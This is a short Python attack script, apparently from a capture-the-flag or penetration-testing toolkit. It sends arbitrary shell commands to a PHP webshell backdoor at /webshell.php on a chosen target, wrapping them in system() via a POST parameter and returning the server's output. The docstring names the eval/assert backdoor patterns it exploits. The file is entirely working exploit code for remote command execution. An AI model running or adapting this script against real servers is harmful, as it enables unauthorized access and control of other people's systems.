
# coding:utf-8
from urllib.request import quote
# from utils.logger import Logger
import traceback
import requests

# logger = Logger.get_log()
proxies = {
    "http": "http://127.0.0.1:8080"
}


def vulnerable_attack(target, target_port, cmd):
    """
    针对php 后门
    eval($_POST[333]);
    assert($_POST[333]);
    """
    try:

        session = requests.Session()
        # echo shell_exec('ls');
        # paramsGet = {"moxiaoxi": "system('{cmd}');".format(cmd=cmd)}
        # response = session.get("http://{}:{}/webshell.php".format(target, target_port), params=paramsGet, headers=headers,timeout=timeout,proxies=proxies)
        paramsPOST = {"moxiaoxi": "system('{cmd}');".format(cmd=cmd)}
        # print(paramsPOST)
        # response = session.post("http://{}:{}/webshell.php".format(target, target_port), data=paramsPOST,
        # headers=headers, timeout=timeout, proxies=proxies)
        response = session.post("http://{}:{}/webshell.php".format(target, target_port), data=paramsPOST,
                                proxies=proxies)
        # print("Status code:   %i" % response.status_code)
        # print("Response body: %s" % response.content)
        res = response.content.decode()
        # before = ""
        # after = "<pre class='xdebug-var-dump' dir='ltr'>"
        # s = res[res.find(before)+len(before):res.find(after)]
        res = res.strip()
    except Exception as e:
        # logger.debug(traceback.format_exc())
        # logger.warning("attack failed", target, "vulnerable attack")
        # res = "error"
        print(e)
        res = "error"
    return res
